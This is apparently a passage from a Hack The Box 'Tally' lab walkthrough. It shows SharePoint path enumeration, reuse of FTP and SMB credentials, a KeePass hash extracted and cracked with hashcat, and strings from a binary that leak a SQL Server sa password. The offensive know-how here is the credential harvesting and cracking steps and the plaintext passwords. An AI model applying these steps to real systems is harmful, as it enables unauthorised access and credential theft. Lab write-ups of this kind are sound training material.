/_vti_bin/webpartpagesdisco.aspx (Status: 200)
/_vti_bin/viewsdisco.aspx (Status: 200)
/_vti_bin/websdisco.aspx (Status: 200)
/_vti_inf.html (Status: 200)
/_layouts/translatablesettings.aspx (Status: 200)
/_vti_adm/admin.asmx (Status: 200)
/alerts.asmx (Status: 200)
/_vti_bin/expurlwp.aspx (Status: 302)
/_vti_bin/exportwp.aspx (Status: 302)
/_vti_bin/spdisco.aspx (Status: 200)
/app_globalresources (Status: 301)
/app_browsers (Status: 301)
/areaservice.asmx (Status: 200)
/aspnet_client (Status: 301)
/bin (Status: 301)
/default.aspx (Status: 200)
/docs/_layouts/viewlsts.aspx (Status: 302)
/dws.asmx (Status: 200)
/dspsts.asmx (Status: 200)
/forms.asmx (Status: 200)
/imaging.asmx (Status: 200)
/lists.asmx (Status: 200)
/meetings.asmx (Status: 200)
/mysite/_layouts/mysite.aspx (Status: 200)
/news/_layouts/viewlsts.aspx (Status: 302)
/outlookadapter.asmx (Status: 200)
/permissions.asmx (Status: 200)
/search.asmx (Status: 200)
/searchcenter/_layouts/viewlsts.aspx (Status: 302)
/sitedata.asmx (Status: 200)
/sitedirectory/_layouts/viewlsts.aspx (Status: 302)
/sites.asmx (Status: 200)
/spscrawl.asmx (Status: 200)
/shared documents/forms/allitems.aspx (Status: 200)
/usergroup.asmx (Status: 200)
/userprofileservice.asmx (Status: 200)
/webpartpages.asmx (Status: 200)
/versions.asmx (Status: 200)
/views.asmx (Status: 200)
/wpresources (Status: 301)
/webs.asmx (Status: 200)
=====================================================
root@kali:~/tally#
```

![](images/2.png)

![](images/3.png)

![](images/4.png)

![](images/5.png)

###### FTP Enumeration

```
FTP details
hostname: tally
workgroup: htb.local
password: UTDRSCH53c"$6hys
Please create your own user folder upon logging in
```

```sh
root@kali:~/tally# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
10.10.10.59	tally tally.htb.local

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
root@kali:~/tally#
```

```sh
root@kali:~/tally# ftp 10.10.10.59
Connected to 10.10.10.59.
220 Microsoft FTP Service
Name (10.10.10.59:root): ftp_user
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-31-17  11:51PM       <DIR>          From-Custodian
05-30-18  09:15PM       <DIR>          Intranet
08-28-17  06:56PM       <DIR>          Logs
09-15-17  09:30PM       <DIR>          To-Upload
09-17-17  09:27PM       <DIR>          User
226 Transfer complete.
ftp> exit
221 Goodbye.
root@kali:~/tally#
```

```sh
root@kali:~/tally/ftp# wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@tally.htb.local'
```

```sh
root@kali:~/tally/ftp# tree
.
└── tally.htb.local
    ├── From-Custodian
    │   ├── RED-528103410.log
    │   ├── RED-528113411.log
    │   ├── RED-528123412.log
    │   ├── RED-528133413.log
    │   ├── RED-5281341.log
    │   ├── RED-528143414.log
    │   ├── RED-528153415.log
    │   ├── RED-528163416.log
    │   ├── RED-528173417.log
    │   ├── RED-528183418.log
    │   ├── RED-528193419.log
    │   ├── RED-528203420.log
    │   ├── RED-528213421.log
    │   ├── RED-528223422.log
    │   ├── RED-528233423.log
    │   ├── RED-5282342.log
    │   ├── RED-528243424.log
    │   ├── RED-528253425.log
    │   ├── RED-528263426.log
    │   ├── RED-528273427.log
    │   ├── RED-528283428.log
    │   ├── RED-528293429.log
    │   ├── RED-528303430.log
    │   ├── RED-528313431.log
    │   ├── RED-528323432.log
    │   ├── RED-528333433.log
    │   ├── RED-5283343.log
    │   ├── RED-528343434.log
    │   ├── RED-528353435.log
    │   ├── RED-528363436.log
    │   ├── RED-528373437.log
    │   ├── RED-528383438.log
    │   ├── RED-528393439.log
    │   ├── RED-528403440.log
    │   ├── RED-528413441.log
    │   ├── RED-528423442.log
    │   ├── RED-528433443.log
    │   ├── RED-5284344.log
    │   ├── RED-528443444.log
    │   ├── RED-528453445.log
    │   ├── RED-528463446.log
    │   ├── RED-528473447.log
    │   ├── RED-528483448.log
    │   ├── RED-528493449.log
    │   ├── RED-528503450.log
    │   ├── RED-5285345.log
    │   ├── RED-5286346.log
    │   ├── RED-5287347.log
    │   ├── RED-5288348.log
    │   └── RED-5289349.log
    ├── Intranet
    │   ├── Binaries
    │   │   └── Firefox Setup 44.0.2.exe
    │   ├── MSFRottenPotato.exe
    │   ├── payload1.exe
    │   └── rottenpotato.exe
    ├── Logs
    │   ├── ftp_connect_8235771490510.txt
    │   ├── ftp_connect_8235771490511.txt
    │   ├── ftp_connect_8235771490512.txt
    │   ├── ftp_connect_8235771490513.txt
    │   ├── ftp_connect_8235771490514.txt
    │   ├── ftp_connect_8235771490515.txt
    │   ├── ftp_connect_8235771490516.txt
    │   ├── ftp_connect_8235771490517.txt
    │   ├── ftp_connect_8235771490518.txt
    │   ├── ftp_connect_8235771490519.txt
    │   ├── ftp_connect_823577149051.txt
    │   ├── ftp_connect_8235771490520.txt
    │   ├── ftp_connect_8235771490521.txt
    │   ├── ftp_connect_8235771490522.txt
    │   ├── ftp_connect_8235771490523.txt
    │   ├── ftp_connect_8235771490524.txt
    │   ├── ftp_connect_8235771490525.txt
    │   ├── ftp_connect_8235771490526.txt
    │   ├── ftp_connect_8235771490527.txt
    │   ├── ftp_connect_8235771490528.txt
    │   ├── ftp_connect_8235771490529.txt
    │   ├── ftp_connect_823577149052.txt
    │   ├── ftp_connect_8235771490530.txt
    │   ├── ftp_connect_8235771490531.txt
    │   ├── ftp_connect_8235771490532.txt
    │   ├── ftp_connect_8235771490533.txt
    │   ├── ftp_connect_8235771490534.txt
    │   ├── ftp_connect_8235771490535.txt
    │   ├── ftp_connect_8235771490536.txt
    │   ├── ftp_connect_8235771490537.txt
    │   ├── ftp_connect_8235771490538.txt
    │   ├── ftp_connect_8235771490539.txt
    │   ├── ftp_connect_823577149053.txt
    │   ├── ftp_connect_8235771490540.txt
    │   ├── ftp_connect_8235771490541.txt
    │   ├── ftp_connect_8235771490542.txt
    │   ├── ftp_connect_8235771490543.txt
    │   ├── ftp_connect_8235771490544.txt
    │   ├── ftp_connect_8235771490545.txt
    │   ├── ftp_connect_8235771490546.txt
    │   ├── ftp_connect_8235771490547.txt
    │   ├── ftp_connect_8235771490548.txt
    │   ├── ftp_connect_8235771490549.txt
    │   ├── ftp_connect_823577149054.txt
    │   ├── ftp_connect_8235771490550.txt
    │   ├── ftp_connect_823577149055.txt
    │   ├── ftp_connect_823577149056.txt
    │   ├── ftp_connect_823577149057.txt
    │   ├── ftp_connect_823577149058.txt
    │   └── ftp_connect_823577149059.txt
    ├── To-Upload
    │   ├── employees-id_number.xlsx
    │   └── Invoices.zip
    └── User
        ├── Administrator
        │   └── New folder
        ├── Ekta
        │   ├── OFSI_quick_guide_flyer.pdf
        │   └── PSAIS_1_April_2017.pdf
        ├── Jess
        │   └── actu8-espreadsheet-designer-datasheet.pdf
        ├── Paul
        │   ├── financial-list-guide.pdf
        │   ├── financial_sanctions_guidance_august_2017.pdf
        │   ├── Monetary_penalties_for_breaches_of_financial_sanctions.pdf
        │   └── New folder
        ├── Rahul
        │   └── Mockups-Backup
        ├── Sarah
        │   ├── MBSASetup-x64-EN.msi
        │   ├── notes.txt
        │   └── Windows-KB890830-x64-V5.52.exe
        ├── Stuart
        │   ├── customers - Copy.csv
        │   └── Unit4-Connect-Financials-Agenda.pdf
        ├── Tim
        │   ├── Files
        │   │   ├── bonus.txt
        │   │   ├── KeePass-2.36
        │   │   │   ├── KeePass.chm
        │   │   │   ├── KeePass.exe
        │   │   │   ├── KeePass.exe.config
        │   │   │   ├── KeePassLibC32.dll
        │   │   │   ├── KeePassLibC64.dll
        │   │   │   ├── KeePass.XmlSerializers.dll
        │   │   │   ├── License.txt
        │   │   │   ├── Plugins
        │   │   │   ├── ShInstUtil.exe
        │   │   │   └── XSL
        │   │   │       ├── KDBX_Common.xsl
        │   │   │       ├── KDBX_DetailsFull_HTML.xsl
        │   │   │       ├── KDBX_DetailsLight_HTML.xsl
        │   │   │       ├── KDBX_PasswordsOnly_TXT.xsl
        │   │   │       └── KDBX_Tabular_HTML.xsl
        │   │   └── tim.kdbx
        │   └── Project
        │       ├── Communications
        │       ├── Log
        │       │   └── do to.txt
        │       └── Vendors
        └── Yenwi
            └── Archive

28 directories, 133 files
root@kali:~/tally/ftp#
```

###### KeePass

```sh
root@kali:~/tally/ftp/tally.htb.local/User/Tim/Files# file tim.kdbx
tim.kdbx: Keepass password database 2.x KDBX
root@kali:~/tally/ftp/tally.htb.local/User/Tim/Files#
```

```sh
root@kali:~/tally/ftp/tally.htb.local/User/Tim/Files# keepass2john tim.kdbx
tim:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
root@kali:~/tally/ftp/tally.htb.local/User/Tim/Files#
```

```sh
root@kali:~/tally/ftp/tally.htb.local/User/Tim/Files# keepass2john tim.kdbx > tim.keepass
root@kali:~/tally/ftp/tally.htb.local/User/Tim/Files# nano tim.keepass
root@kali:~/tally/ftp/tally.htb.local/User/Tim/Files# cat tim.keepass
$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
root@kali:~/tally/ftp/tally.htb.local/User/Tim/Files#
```

[`Hashcat-Example Hashes`](https://hashcat.net/wiki/doku.php?id=example_hashes)

![](images/6.png)

```sh
root@kali:~/tally/ftp/tally.htb.local/User/Tim/Files# hashcat -m 13400 tim.keepass /usr/share/wordlists/rockyou.txt --force
hashcat (v4.0.1) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i5-6360U CPU @ 2.00GHz, 512/1497 MB allocatable, 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Password length minimum: 0
Password length maximum: 256

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.
Watchdog: Temperature retain trigger disabled.

* Device #1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=13400 -D _unroll'
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921512
* Keyspace..: 14344386

- Device #1: autotuned kernel-accel to 128
- Device #1: autotuned kernel-loops to 128
[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit => [s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit => r

Resumed

$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da:simplementeyo

Session..........: hashcat
Status...........: Cracked
Hash.Type........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)
Hash.Target......: $keepass$*2*6000*222*f362b5565b916422607711b54e8d0b...1cd7da
Time.Started.....: Thu May 31 17:21:11 2018 (23 secs)
Time.Estimated...: Thu May 31 17:21:34 2018 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:     1143 H/s (9.59ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 25088/14344386 (0.17%)
Rejected.........: 0/25088 (0.00%)
Restore.Point....: 24576/14344386 (0.17%)
Candidates.#1....: 280789 -> sassygurl
HWMon.Dev.#1.....: N/A

[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit => Started: Thu May 31 17:21:08 2018
Stopped: Thu May 31 17:21:35 2018
root@kali:~/tally/ftp/tally.htb.local/User/Tim/Files#
```

![](images/7.png)

![](images/8.png)

![](images/9.png)

![](images/10.png)

![](images/11.png)

###### SMB

```sh
root@kali:/mnt# ls
root@kali:/mnt# mkdir smb
root@kali:/mnt# ls
smb
root@kali:/mnt#
root@kali:/mnt# mount -t cifs -o username=Finance //10.10.10.59/ACCT /mnt/smb
Password for Finance@//10.10.10.59/ACCT:  **********
root@kali:/mnt# cd smb/
root@kali:/mnt/smb# ls -l
total 0
drwxr-xr-x 2 root root 0 Sep 17  2017 Customers
drwxr-xr-x 2 root root 0 Aug 28  2017 Fees
drwxr-xr-x 2 root root 0 Aug 28  2017 Invoices
drwxr-xr-x 2 root root 0 Sep 17  2017 Jess
drwxr-xr-x 2 root root 0 Aug 28  2017 Payroll
drwxr-xr-x 2 root root 0 Sep  1  2017 Reports
drwxr-xr-x 2 root root 0 Sep 17  2017 Tax
drwxr-xr-x 2 root root 0 Sep 13  2017 Transactions
drwxr-xr-x 2 root root 0 Sep 15  2017 zz_Archived
drwxr-xr-x 2 root root 0 Sep 17  2017 zz_Migration
root@kali:/mnt/smb#
root@kali:/mnt/smb# cd zz_Migration
root@kali:/mnt/smb/zz_Migration# ls -l
total 412
drwxr-xr-x 2 root root      0 Sep 11  2017  Backup
drwxr-xr-x 2 root root      0 Sep 17  2017  Binaries
-rwxr-xr-x 1 root root  11762 Aug 28  2017  install-notes.txt
drwxr-xr-x 2 root root      0 Sep 11  2017  Integration
-rwxr-xr-x 1 root root 406181 Sep 15  2017 'Sage 50 v1.9.3.1 Hotfix 1 Release Notes.pdf'
root@kali:/mnt/smb/zz_Migration# cd Binaries
root@kali:/mnt/smb/zz_Migration/Binaries# ls -l
total 463204
drwxr-xr-x 2 root root         0 Aug 28  2017  CardReader
drwxr-xr-x 2 root root         0 Sep 17  2017  Evals
-rwxr-xr-x 1 root root   2241216 Aug 31  2017  FileZilla_Server-0_9_60_2.exe
-rwxr-xr-x 1 root root     74110 Sep 15  2017  ImportGSTIN.zip
-rwxr-xr-x 1 root root  69999448 Aug 27  2017  NDP452-KB2901907-x86-x64-AllOS-ENU.exe
drwxr-xr-x 2 root root         0 Sep 21  2017 'New folder'
-rwxr-xr-x 1 root root 401347664 Aug 27  2017  Sage50_2017.2.0.exe
drwxr-xr-x 2 root root         0 Sep 13  2017 'Tally.ERP 9 Release 6'
-rwxr-xr-x 1 root root    645729 Sep 15  2017  windirstat1_1_2_setup.exe
root@kali:/mnt/smb/zz_Migration/Binaries# cd 'New folder'
root@kali:/mnt/smb/zz_Migration/Binaries/New folder# ls -l
total 676308
-rwxr-xr-x 1 root root 389188014 Sep 13  2017 crystal_reports_viewer_2016_sp04_51051980.zip
-rwxr-xr-x 1 root root  18159024 Sep 11  2017 Macabacus2016.exe
-rwxr-xr-x 1 root root  21906356 Aug 29  2017 Orchard.Web.1.7.3.zip
-rwxr-xr-x 1 root root    774200 Sep 17  2017 putty.exe
-rwxr-xr-x 1 root root    483824 Sep 15  2017 RpprtSetup.exe
-rwxr-xr-x 1 root root 254599112 Sep 11  2017 tableau-desktop-32bit-10-3-2.exe
-rwxr-xr-x 1 root root    215552 Sep  1  2017 tester.exe
-rwxr-xr-x 1 root root   7194312 Sep 13  2017 vcredist_x64.exe
root@kali:/mnt/smb/zz_Migration/Binaries/New folder#
```

```sh
root@kali:/mnt/smb/zz_Migration/Binaries/New folder# strings tester.exe
!This program cannot be run in DOS mode.
Rich7J
.text
`.rdata
@.data
.reloc
h)<B
h3<B
h=<B
hG<B
hQ<B
h[<B
he<B
uLhP
hhBB
PSVW
Y_^[
@SVW
Y_^[
;U$w5
;U$t
;M$u
;E$v
M$+M
SVWP
Y_^[
;U$w5
E$+E
;E$v
M$+M
h :B
PQQSVW
Y_^[
Ph$DB
Ph<DB
h@:B
Y_^[
_^[]
hHEB
h[:B
5h?C
9;t>
=t?C
YYhLEB
=p?C
H(Qj
ht?C
%t?C
= JB
5T@C
=T@C
h1;B
h1;B
hL;B
hL;B
wLVj
FD^[
A0V3
_^[]
OD_[
9N8u
vLWj
 s,Wj
_^[]
QQSV
9C8u
X_^]
9E$WWV
tFVS
t,WW9}
WWVSW
h,QB
h8QB
h@QB
hLQB
hXQB
htQB
h$RB
h<RB
hPRB
hdRB
h0SB
hPSB
hlSB
h8TB
hPTB
hhTB
h|TB
35h0C
_[^]
35h0C
^_[]
YY^]
SVW3
_^[]
5DAC
35h0C
%LAB
%XAB
%TAB
%PAB
%8AB
%HAB
%DAB
%@AB
%<AB
SVWj
hPSB
5h0C
5h0C
hdAB
j Y+
=DBC
u"h,BC
h8BC
j Y+
=EBC
h,BC
%`AB
Y__^[
8csm
%HBC
5@CC
=<CC
%0CC
-,CC
5@CC
=<CC
%0CC
-,CC
hpEC
Y__^[
Genu
5ineI
5ntel
t#=`
oF f
oF f
oF f
oV f
o^0f
of@f
onPf
ov`f
o~pf
FGIu
FGIu
oF f
oF f
oF f
oV f
o^0f
of@f
onPf
ov`f
o~pf
FGIu
FGIu
QQSVWd
;p$u
8csm
8RCC
8MOC
8csm
j Y+
QSVW
Wu5j
hLwB
h\wB
3=h0C
^_[]
VhtwB
hlwB
h,QB
%T@B
Vh|wB
htwB
h8QB
h|wB
h@QB
hLQB
hXQB
j Y+
35h0C
8_^]
xf~U
8csm
t!hh0C
hh0C
j Y+
BVj(j
j8h(
?csm
8csm
>csm
>csm
u	9^
hL>C
>csm
u PW
?MOC
?RCC
|c;F
@u(j
u Qj
YYPV
9p u"
:csm
ft%9q
:csm
r39z
@_^[]
@_^[]
URPQQh
L$,3
UVWS
[_^]
SVWj
_^[]
SVWUj
]_^[
;t$,v-
UQPXY]Y[
5h0C
350FC
PPPPP
VVVVV
VVVVV
Dz8QQ
<ct	<st
F4_^[]
QQSV
t<Sj
F4_^[
	<et
8^1u
y1*t
A1<Fu
<Nu&
u<dt
<Xu]
^$+^8+
y1*t
F1<at
<At
F1<gt
v(PQ
F1<gt
N @@
F8SP
9F(~
u'9E
C;^8u
0^_[]
PPPPPPPP
PPPPP
v+8]
RPRQh
va8]
PSWS
WWWWW
SSSSS
tVWh
"tPj
WWWWW
~0WPQ
Qhh0C
Qhh0C
t39E
_^[]
uC9u
SVWj
A<Au
VWSP
_^[]
[_^]
wIPS3
X_^]
j X+
f99t
j X+
f99t
f99t
f99t
f99t
5h0C
99t
wOtD
j Y+
5h0C
QWWP
A98u
>"u1
< t1<	t-
QQSVW
PPPPP
Y_^]
QSSSSj
=h0C
j Y+
t#Vh
j Y+
Af;:u
 VWh
PPPPP
f90t
f97t
VVVVV
QQSVW
j.Yf;
j.Yf;
tyPVj@W
_tcPVj@
uCPVj
u#j,Xf;
PPPPP
SSSSS
Wj.Y
Y_^]
>Cu43
PSPt
PPPPP
SVjU
SSSSS
PSjU
VVVVV
WWWWW
_^[]
SSSSS
8Ou
F _^[
8Ou
PPPPP
j;Xf9
j;Xf9
8f;9
PPPPP
PPPPP
j _;
j Y+
j Y+
j Y+
j Y+
35h0C
>_^]
f;1u
,0<	w
j0Xj
j:Xf;
u0jAXf;
jZXf;
j0Xf;
j:Xf;
u0jAXf;
jZXf;
t1;E
@Hx3C
FLY;
tmhd
tehd
hrQA
~';_
GWVj
QVWSj
0SVW
u$SW
8E j0
j0Yu
j0Yf
v;j0
Wj0XPS
jdVQ
Gj0X
80t/
-jd_;
PPPPP
Vj0S
_^[t
QWPV
}'9E
 _^[
PPPPP
QQVW
u,t6
$[_^
_[^]
SVW3
hfnA
j Y+
5h0C
h|TB
QSVW
Wu5j
hLwB
h\wB
3=h0C
^_[]
h,QB
h8QB
h@QB
hLQB
hXQB
j Y+
35h0C
t.SV
u<WW
WWWWW
9E WW
t2RWV
9E(j
PPPPPWS
QQQP
PP9E u:PPVWP
f90t
f90u
PVSQSWV
PVSQj
QVVVj
xE;5 KC
xE;5 KC
GQQ@j
SShU
;5 KC
(@t
SWRQ
u);U
t9 S
;T9
;D9$
SVW<
_^[]
@( t
@_^]
;= KC
5h0C
j,h
j Y+
SVWjA_jZ+
uBjAYjZ+
t:f;
f92t
SSSSS
WWWWW
WWWPWS
u-PWWS
8x3C
_^[]
IH;A
SSVWh
xHx3C
9wLt
hx3C
f9:t!V
f9:u
QSVW
YWWW
SVWW
WSVPP
SWj=V
u{9]
SSSSS
PPPPP
QQSWj0j@
Y_[^]
xg;5 KC
_^[]
 PjPW
$PjQW
*PjTW
+PjUW
,PjVW
-PjWW
.PjRW
/PjSW
HPjPW
LPjQW
"<;u
FjPV
<0|o<9
_^[]
Pj(W
Pj)W
Pj(W
Pj)W
Pj W
Pj W
Y_^]
SVWf9
_^[]
Y_^[
YY^]
WWWWW
_^[]
u	!FX@
u^9^\t/
VX9^`tT
PWjUR
PPPPP
9^\t|
;N\u\W
SSSSS
!FX@
SSSSS
:f;>u
:f;>u
j	PjYV
QQSVW
u2Vj@hX
j@Wh
thj@
tJj_S
j@Sj
PPPPP
8_^]
9^`u
_^[]
_^[]
;K\u
9C`t
9C\t
;K\u
9C`u99C\t4
9C`u5Wj
t9Wj
:f;>u
:f;>u
WHPhh
tnf9
HPhX
f98t
t^WjU
j@Sh
j@%@
Wj _
jrY;
jrY;
jrY;
stW;
stW;
PPPPP
_^[t
SSSSS
SVW3
_^[]
PPPPP
D8(Ht
(HXtJf
Cf9E
Xf9E
D8(Ht5F
D9,+
D:-$
L:-^_[
_f9;
;5 KC
 VWj
QQS3
v#WR
PPPPPPPP
VPRQ
PRPQh
j-XGf
SVjA[jZ^+
jAZjZ^
t@f;
<$tL
|%=2
~"VW
t2QVS
QQSV
_^[]
Y_^[
Y_^[
v	N+D$
WVU3
v	N+D$
WVS3
<$Xf
^_[3
SQLSTATE:
Message:
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
select * from Orchard_Users_UserPartRecord
Unknown exception
bad cast
bad locale name
false
true
generic
iostream
iostream stream error
ios_base::badbit set
ios_base::failbit set
ios_base::eofbit set
invalid string position
string too long
bad allocation
unknown error
address family not supported
address in use
address not available
already connected
argument list too long
argument out of domain
bad address
bad file descriptor
bad message
broken pipe
connection aborted
connection already in progress
connection refused
connection reset
cross device link
destination address required
device or resource busy
directory not empty
executable format error
file exists
file too large
filename too long
function not supported
host unreachable
identifier removed
illegal byte sequence
inappropriate io control operation
interrupted
invalid argument
invalid seek
io error
is a directory
message size
network down
network reset
network unreachable
no buffer space
no child process
no link
no lock available
no message available
no message
no protocol option
no space on device
no stream resources
no such device or address
no such device
no such file or directory
no such process
not a directory
not a socket
not a stream
not connected
not enough memory
not supported
operation canceled
operation in progress
operation not permitted
operation not supported
operation would block
owner dead
permission denied
protocol error
protocol not supported
read only file system
resource deadlock would occur
resource unavailable try again
result out of range
state not recoverable
stream timeout
text file busy
timed out
too many files open in system
too many files open
too many links
too many symbolic link levels
value too large
wrong protocol type
FlsAlloc
FlsFree
FlsGetValue
FlsSetValue
InitializeCriticalSectionEx
InitOnceExecuteOnce
CreateEventExW
CreateSemaphoreW
CreateSemaphoreExW
CreateThreadpoolTimer
SetThreadpoolTimer
WaitForThreadpoolTimerCallbacks
CloseThreadpoolTimer
CreateThreadpoolWait
SetThreadpoolWait
CloseThreadpoolWait
FlushProcessWriteBuffers
FreeLibraryWhenCallbackReturns
GetCurrentProcessorNumber
CreateSymbolicLinkW
GetCurrentPackageId
GetTickCount64
GetFileInformationByHandleEx
SetFileInformationByHandle
GetSystemTimePreciseAsFileTime
InitializeConditionVariable
WakeConditionVariable
WakeAllConditionVariable
SleepConditionVariableCS
InitializeSRWLock
AcquireSRWLockExclusive
TryAcquireSRWLockExclusive
ReleaseSRWLockExclusive
SleepConditionVariableSRW
CreateThreadpoolWork
SubmitThreadpoolWork
CloseThreadpoolWork
CompareStringEx
GetLocaleInfoEx
LCMapStringEx
0123456789abcdefghijklmnopqrstuvwxyz

0123456789abcdefghijklmnopqrstuvwxyz
bad array new length
bad exception
__based(
__cdecl
__pascal
__stdcall
__thiscall
__fastcall
__vectorcall
__clrcall
__eabi
__ptr64
__restrict
__unaligned
restrict(
 new
 delete
operator
`vftable'
`vbtable'
`vcall'
`typeof'
`local static guard'
`string'
`vbase destructor'
`vector deleting destructor'
`default constructor closure'
`scalar deleting destructor'
`vector constructor iterator'
`vector destructor iterator'
`vector vbase constructor iterator'
`virtual displacement map'
`eh vector constructor iterator'
`eh vector destructor iterator'
`eh vector vbase constructor iterator'
`copy constructor closure'
`udt returning'
`RTTI
`local vftable'
`local vftable constructor closure'
 new[]
 delete[]
`omni callsig'
`placement delete closure'
`placement delete[] closure'
`managed vector constructor iterator'
`managed vector destructor iterator'
`eh vector copy constructor iterator'
`eh vector vbase copy constructor iterator'
`dynamic initializer for '
`dynamic atexit destructor for '
`vector copy constructor iterator'
`vector vbase copy constructor iterator'
`managed vector copy constructor iterator'
`local static thread guard'
operator ""
operator co_await
 Type Descriptor'
 Base Class Descriptor at (
 Base Class Array'
 Class Hierarchy Descriptor'
 Complete Object Locator'
('8PW
700PP
`h`hhh
xwpwpp
(null)
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
d8L2
[aOni*{
@2&@
"RP(
eLK(w
FEMh
h0'D
owM&
~ $s%r
@b;zO]
$qE}
;*xh
["93
iu+-,
\lo}
obwQ4
&Sgw
R	E]
?nz(
=87M
v2!L.2
	cQr
X/4B
k=yI
^<V7w
W&|.
CorExitProcess
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
log10
sinh
cosh
tanh
asin
acos
atan
atan2
sqrt
ceil
floor
fabs
modf
ldexp
_cabs
_hypot
fmod
frexp
_logb
_nextafter
NAN(SNAN)
nan(snan)
NAN(IND)
nan(ind)
e+000
Sunday
Monday
Tuesday
Wednesday
Thursday
Friday
Saturday
January
February
March
April
June
July
August
September
October
November
December
MM/dd/yy
dddd, MMMM dd, yyyy
HH:mm:ss
AreFileApisANSI
EnumSystemLocalesEx
GetDateFormatEx
GetTimeFormatEx
GetUserDefaultLocaleName
IsValidLocaleName
LCIDToLocaleName
LocaleNameToLCID
AppPolicyGetProcessTerminationMethod
?XgB
1#INF
1#QNAN
1#SNAN
1#IND
?X&eB
?Ltm
tLVv
?h6_~
37.=
?7Tf(
=\uI=
g:"(
$O1=
uXO=
1w<=
>'eH
pnJ=
Ht=c
]vQ<)8
z1}B
X4I+
|)P!?Ua0
		!=
+34?
??7;
MkK?
R_V?
9&\?
Eb2]A=
f#I=
hb?O2
H`3=
c?e2
Le?2
0h?[
2ieO=
|W8A=
np?z
)(q?
}~:f
t?,&
u?^p?o4
!9v?
GYM=
Pex?0
6K{?
E	M=
X-F=
w}?0
y1~?|"
V%A+=
4';=
q	!
#D5p
La8i
{4Wf
Ai0T
@VNQ
p4"%
P'E=
ls1=
?PiB
{^C=
n{;=
3<L=
?|I7Z#
aDJ=
>,'1D=
+NB=
?g)([|X>=
?|[{
~*L=
u!K=
?IT$7
-8 ?
.h ?
2 !?
4P!?
!y##
98"?
:h"?bC
? #?
@H#?43
Ax#?uN}*
r7Yr7=
.K="=
F0$?3=1
H`$?h|
%?uY
NH%?
Px%?
%?\9
&?~YK|
sU0&?W
VX&?
4g%6
:]=O>
#w_j
(+E
V~|_
!|.4
G"jm
6(`J
k:UG
UY =
Bfe9
CqTR;
AiFC.
?5a1
<{Q}<
hI{L[
<8bunz8
<V/>
?(FN\
<'*6
?3xj
<)TH
K<<H!
m1WY$
?#%X.y
F||<##
$x<e
<]%>
T~OXu
?.)T
zyC7
k7+%
<@En[vP
b<log10
lzZ?
	k8=
?5Wg4p
Nv$^
w(@
BC .=
(lX
#{ =
`~R=
}s"=
%S#[k
"B <1=
\-!y
#.X'=
i9+=
.text$di
.text$mn
.text$x
.text$yd
.idata$5
.00cfg
.CRT$XCA
.CRT$XCAA
.CRT$XCC
.CRT$XCL
.CRT$XCU
.CRT$XCZ
.CRT$XIA
.CRT$XIAA
.CRT$XIAC
.CRT$XIC
.CRT$XIZ
.CRT$XLA
.CRT$XLZ
.CRT$XPA
.CRT$XPX
.CRT$XPXA
.CRT$XPZ
.CRT$XTA
.CRT$XTZ
.rdata
.rdata$T
.rdata$r
.rdata$sxdata
.rdata$zzzdbg
.rtc$IAA
.rtc$IZZ
.rtc$TAA
.rtc$TZZ
.tls
.tls$
.tls$ZZZ
.xdata$x
.idata$2
.idata$3
.idata$4
.idata$6
.data
